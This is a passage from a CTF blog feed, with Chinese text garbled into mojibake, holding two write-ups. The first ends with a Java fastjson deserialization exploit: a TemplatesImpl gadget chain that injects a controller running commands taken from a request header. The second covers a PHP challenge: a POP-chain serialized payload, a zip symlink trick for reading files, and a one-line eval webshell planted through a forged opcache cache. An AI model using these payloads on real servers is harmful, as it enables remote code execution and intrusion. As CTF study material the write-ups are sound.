class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ç›´æ¥å°†è¯·æ±‚å¤´cmdçš„å†…å®¹ä¼ å…¥execæ‰§è¡Œï¼Œå°†å‘½ä»¤çš„è¾“å‡ºå†™å›åˆ° <code>ServletResponse</code> çš„è¾“å‡ºæµä¸­ã€‚</p></blockquote><p>æ€»ä½“exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.ctf.controller.EvilController;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;sloth&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(base64Encode(bytes1));</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311292216429.png"                      alt="image-20231129221646083"                ><figcaption>image-20231129221646083</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ez_overwrite-å‡ºé¢˜è®°å½•/wp</title>
      <link href="/2023/10/22/ez-overwrite-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/"/>
      <url>/2023/10/22/ez-overwrite-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-åºè¨€"><a href="#0x00-åºè¨€" class="headerlink" title="0x00 åºè¨€"></a>0x00 åºè¨€</h2><p>æ ¡èµ›å‡ºçš„ä¸€é“phpçš„wpï¼Œè®°å½•ä¸€ä¸‹</p><h2 id="0x01-è§£æ"><a href="#0x01-è§£æ" class="headerlink" title="0x01 è§£æ"></a>0x01 è§£æ</h2><p>è€ƒç‚¹ï¼šååºåˆ—åŒ–ã€php8æ–°ç‰¹æ€§ã€è½¯é“¾æ¥è¯»æ–‡ä»¶ã€opcacheä¼ªé€ </p><p>é¦–å…ˆæ˜¯ååºåˆ—åŒ–ï¼Œæºç ä¸­ç»™äº†Aã€Bã€Cä¸‰ä¸ªç±»ï¼Œå…¥å£ç‚¹æ˜¯Cçš„<code>wakeup</code>ï¼Œå¯ä»¥è§¦å‘<code>$this-&gt;file</code>çš„<code>toString</code>,é€‰æ‹©Bç±»çš„toStringè§¦å‘ã€‚Bç±»çš„toStringæ˜¯é“¾å¼è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºè§¦å‘getï¼Œè·Ÿè¿›çš„Bçš„getä¸­çš„<code>$func()</code>å¯ä»¥è®¾ç½®functionå±æ€§ä½Aç±»ï¼Œè§¦å‘å…¶invokeï¼Œä¹‹ååªè¦æ»¡è¶³Aç±»çš„numberå±æ€§æ˜¯<code>next_challenge</code>å³å¯ï¼Œè¿™é‡Œnumberæ˜¯ç§æœ‰å±æ€§ï¼Œç¼–å†™popçš„æ—¶å€™ç”¨æ„é€ å‡½æ•°èµ‹å€¼ï¼Œpayloadå¦‚ä¸‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$number</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;number =<span class="string">&quot;next_challenge&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fans</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>,<span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;fans=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;fans-&gt;<span class="function"><span class="keyword">function</span>=<span class="title">new</span> <span class="title">A</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//?pop=O%3A1%3A%22C%22%3A2%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A4%3A%22fans%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22fans%22%3BN%3Bs%3A8%3A%22function%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A9%3A%22%00A%00number%22%3Bs%3A14%3A%22next_challenge%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congratulations!Next challenge is in final_challenge_.php.Your key is dgdr_09hsqhy8</span><br></pre></td></tr></table></figure></div><p>æ ¹æ®å›æ˜¾è¿›å…¥final_challenge_.php,æ ¹æ®æç¤ºä¼ å‚keyå¾—åˆ°æºç ,</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/final_challenge_.php?key=dgdr_09hsqhy8</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;Hint.php&#x27;</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$key</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Please enter the key.($key = $_GET[\&#x27;key\&#x27;])&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$action</span>)&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>)===<span class="string">&quot;bde8186e47bad30bd8eca3cb72b4e4cd&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0_1</span>: <span class="comment">//è¯»å–phpä¿¡æ¯</span></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">05_23</span>:<span class="comment">//æç¤º</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$HINT</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0o2_23</span>:<span class="comment">//æŠŠå½“å‰ç›®å½•å‹ç¼©å­˜å‚¨åˆ°tmpç›®å½•ä¸‹å¹¶è¯»å–</span></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;zip -r /tmp/you_can_read.zip *&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/tmp/you_can_read.zip&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">011_255</span>:<span class="comment">//æ‰«æå½“å‰ç›®å½•</span></span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x0_555</span>:<span class="comment">//å†™å…¥ä¸€ä¸ªå‹ç¼©åŒ…you_can_write.zip</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/you_can_write.zip&#x27;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0b1_1</span>:<span class="comment">//è§£å‹you_can_write.zip</span></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o you_can_write.zip&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œé¦–å…ˆæ˜¯ä¸€ä¸ªphp8.1çš„ç‰¹æ€§ï¼Œå¯ä»¥ä½¿ç”¨obxç­‰å­—ç¬¦è¡¨ç¤ºæ•°å­—ï¼Œä»¥0bå¼€å¤´æ˜¯äºŒè¿›åˆ¶ï¼Œ0oæˆ–å•ç‹¬0å¼€å¤´æ˜¯å…«è¿›åˆ¶,0xæ˜¯åå…­è¿›åˆ¶ï¼Œå¹¶ä¸”å…è®¸åŠ å…¥ä¸‹åˆ’çº¿ï¼Œå› æ­¤å‡ ä¸ªcaseå¯¹åº”</p><ul><li>0_1  â€”  1</li><li>05_23   â€”  339</li><li>0b1_1  â€” 3</li><li>0x0_555 â€” 1365</li><li>011_255 â€” 4781</li><li>0o2_23  â€” 147</li></ul><p><a class="link"   href="https://php.watch/versions/8.1/explicit-octal-notation" >https://php.watch/versions/8.1/explicit-octal-notation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>é¦–å…ˆçœ‹HINTï¼Œaction&#x3D;339</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Read phpinfo carefully, you can use OPcache for RCE purposes.</span><br></pre></td></tr></table></figure></div><p>æç¤ºä½¿ç”¨OPcacheæ¥RCEï¼Œå…ˆåˆ°phpinfoä¸­æŸ¥çœ‹opcacheçš„é…ç½®ï¼Œå¯ä»¥çœ‹åˆ°ç¼“å­˜å­˜å‚¨åœ¨tmpç›®å½•ä¸‹ï¼Œå¹¶ä¸”å¼€å¯äº†æ—¶é—´æˆ³éªŒè¯</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242254.png"                      alt="image-20230809041723178"                ><figcaption>image-20230809041723178</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242923.png"                      alt="image-20230809041715238"                ><figcaption>image-20230809041715238</figcaption></figure></p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>æ€»ä½“æ€è·¯æ˜¯ä¼ªé€ ä¸€ä¸ªopcacheçš„ç¼“å­˜ä¼ è¾“ä¸Šå»æ¥RCEï¼Œæ ¹æ®é…ç½®å¯ä»¥çŸ¥é“ç¼“å­˜å­˜å‚¨è·¯å¾„,å¦‚index.phpå°±åœ¨ <code>/tmp/[system_id]/var/www/html/index.php.bin</code>,è€Œå…¶ä¸­system_idéœ€è¦é€šè¿‡å½“å‰Zendå’ŒPHPçš„ç‰ˆæœ¬å·è®¡ç®—å¾—å‡ºï¼ŒåŒæ—¶ä¸ºäº†é€šè¿‡æ—¶é—´æˆ³éªŒè¯ï¼Œè¿˜éœ€è¦è¯»å–ä¸‹è½½é¢˜ç›®ç¯å¢ƒä¸Šçš„.binæ–‡ä»¶ï¼Œsystem_idçš„è®¡ç®—è™½ç„¶githubä¸Šæœ‰è„šæœ¬ï¼Œä½†éƒ½æ˜¯php7çš„ç‰ˆæœ¬,è®¡ç®—çš„system_idä¸é¢˜ç›®ä¸ç¬¦åˆï¼Œå› æ­¤éœ€è¦æœ¬åœ°ä½¿ç”¨dockeræ­å»ºphp8.2.2+apacheæ¥å¾—åˆ°system_id,é¢˜ç›®ç”¨çš„æ˜¯æœ€å®¹æ˜“æ‰¾åˆ°çš„é•œåƒï¼Œæ ¹æ®å›æ˜¾æŠ¥æ–‡ï¼Œåœ¨dockerhubçš„phpé•œåƒä¸­æœç´¢8.2.2-apacheçš„tag</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242581.png"                      alt="image-20230809044627212"                ><figcaption>image-20230809044627212</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242108.png"                      alt="image-20230809044710032"                ><figcaption>image-20230809044710032</figcaption></figure></p><p>æœ¬åœ°æ‹‰å–</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:8.2.2-apache</span><br></pre></td></tr></table></figure></div><p>åˆ›å»ºå®¹å™¨</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name ez_test -d  -p 5003:80  php:8.2.2-apache</span><br></pre></td></tr></table></figure></div><p>è¿›å…¥å®¹å™¨</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it å®¹å™¨id /bin/bash</span><br></pre></td></tr></table></figure></div><p>å®‰è£…opcache</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-php-ext-install opcache</span><br></pre></td></tr></table></figure></div><p>æ­¤æ—¶æ‰§è¡Œphp -vï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯,å‡ºç°ä¸‹é¢è¯´æ˜å®‰è£…æˆåŠŸ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP 8.2.2 (cli) (built: Feb  9 2023 05:32:15) (NTS)</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v4.2.2, Copyright (c) Zend Technologies</span><br><span class="line">    with Zend OPcache v8.2.2, Copyright (c), by Zend Technologies</span><br></pre></td></tr></table></figure></div><p>å¼€å¯opcahceå¹¶é‡å¯å®¹å™¨</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-php-ext-enable opcache.so</span><br><span class="line">docker restart å®¹å™¨id</span><br></pre></td></tr></table></figure></div><p>é»˜è®¤ç¼“å­˜ç›®å½•å°±æ˜¯tmpï¼Œä¸ç”¨ä¿®æ”¹ï¼Œéœ€è¦æ‰“å¼€opcache.file_cache_onlyä½¿å¾—ç”Ÿæˆç¼“å­˜ï¼Œä¿®æ”¹<code>/usr/local/etc/php/php.ini-development </code>åŠ å…¥ä¸‹é¢çš„é…ç½®ï¼Œä¿®æ”¹ä¼˜å…ˆçº§,ä¹‹åé‡å¯å®¹å™¨ä½¿å…¶ç”Ÿæ•ˆ</p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">opcache.file_cache_only</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>æ­¤æ—¶å»tmpç›®å½•ä¸‹å°±å¯ä»¥å‘ç°æœ‰ç¼“å­˜ç”Ÿæˆï¼Œæ–‡ä»¶åå³ä¸ºsystem_id</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@889641c397dc:/tmp# ls</span><br><span class="line">8131f93e8d92a77c0a8ff12ef84b05b1</span><br></pre></td></tr></table></figure></div><p>ç”±äºé¢˜ç›®è¿˜å¼€å¯äº†<strong>æ—¶é—´æˆ³éªŒè¯</strong>ï¼Œå› æ­¤éœ€è¦è¯»å–é¢˜ç›®çš„binæ–‡ä»¶ï¼Œå¯ä»¥è¯»å–index.php.bin,è¿™é‡Œè¯»å–æ–‡ä»¶å¯ä»¥ç”¨è½¯é“¾æ¥æ”»å‡»</p><p>,ç”±äºé¢˜ç›®ä¼šè¯»å–tmpä¸‹çš„you_can_read.zipï¼Œè™½ç„¶ä¼šå…ˆæ‰§è¡Œæ‰“åŒ…å½“å‰ç›®å½•ï¼Œä½†å½“you_can_read.zipå·²ç»å­˜åœ¨æ—¶ä¸ä¼šè¦†ç›–ï¼Œå› æ­¤å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘<code>/tmp/8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/index.php.bin</code>ç„¶åå°†æ”¹è½¯é“¾æ¥é‡å‘½åæˆyou_can_read.zip,å†æ‰“åŒ…ä¸€å±‚å˜ä¸ºyou_can_write.zip</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /tmp/8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/index.php.bin test</span><br><span class="line">zip -y you_can_write.zip you_can_read.zip</span><br><span class="line">cat you_can_write.zip|base64</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEsDBAoAAAAAAEU0CVffxjBJQAAAAEAAAAAQABwAeW91X2Nhbl9yZWFkLnppcFVUCQAD4sLSZOLC0mR1eAsAAQT3AQAABBQAAAAvdG1wLzgxMzFmOTNlOGQ5MmE3N2MwYThmZjEyZWY4NGIwNWIxL3Zhci93d3cvaHRtbC9pbmRleC5waHAuYmluUEsBAh4DCgAAAAAARTQJV9/GMElAAAAAQAAAABAAGAAAAAAAAAAAAO2hAAAAAHlvdV9jYW5fcmVhZC56aXBVVAUAA+LC0mR1eAsAAQT3AQAABBQAAABQSwUGAAAAAAEAAQBWAAAAigAAAAAA</span><br></pre></td></tr></table></figure></div><p>å†™å…¥you_can_write.zip</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/final_challenge_.php?key=dgdr_09hsqhy8&amp;action=1365</span><br><span class="line">post: data=UEsDBAoAAAAAAEU0CVffxjBJQAAAAEAAAAAQABwAeW91X2Nhbl9yZWFkLnppcFVUCQAD4sLSZOLC0mR1eAsAAQT3AQAABBQAAAAvdG1wLzgxMzFmOTNlOGQ5MmE3N2MwYThmZjEyZWY4NGIwNWIxL3Zhci93d3cvaHRtbC9pbmRleC5waHAuYmluUEsBAh4DCgAAAAAARTQJV9/GMElAAAAAQAAAABAAGAAAAAAAAAAAAO2hAAAAAHlvdV9jYW5fcmVhZC56aXBVVAUAA+LC0mR1eAsAAQT3AQAABBQAAABQSwUGAAAAAAEAAQBWAAAAigAAAAAA</span><br></pre></td></tr></table></figure></div><p>ä¹‹åè§£å‹  &#x2F;final_challenge_.php?key&#x3D;dgdr_09hsqhy8&amp;action&#x3D;3</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0b1_1</span>:</span><br><span class="line">      <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o you_can_write.zip&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div><p>å†è¯»å–ä¾¿å¯ä»¥å¾—åˆ°é¢˜ç›®çš„index.php.bin</p><p>&#x2F;final_challenge_.php?key&#x3D;dgdr_09hsqhy8&amp;action&#x3D;147</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242262.png"                      alt="image-20230809065217256"                ><figcaption>image-20230809065217256</figcaption></figure></p><p>æ—¶é—´æˆ³ä¿¡æ¯åœ¨ç¬¬49å­—èŠ‚å¤„</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230242261.png"                      alt="image-20230809070116002"                ><figcaption>image-20230809070116002</figcaption></figure></p><p>åœ¨è‡ªå·±çš„å®éªŒå®¹å™¨ä¸­å†™ä¸€ä¸ªä¸€å¥è¯é©¬index.php,è®¿é—®å¾—åˆ°å…¶ç¼“å­˜index.php.binï¼Œä¿®æ”¹æ—¶é—´æˆ³</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230243585.png"                      alt="image-20230809070616488"                ><figcaption>image-20230809070616488</figcaption></figure></p><blockquote><p>å°†dockerå†…æ–‡ä»¶å–å‡ºä½¿ç”¨docker 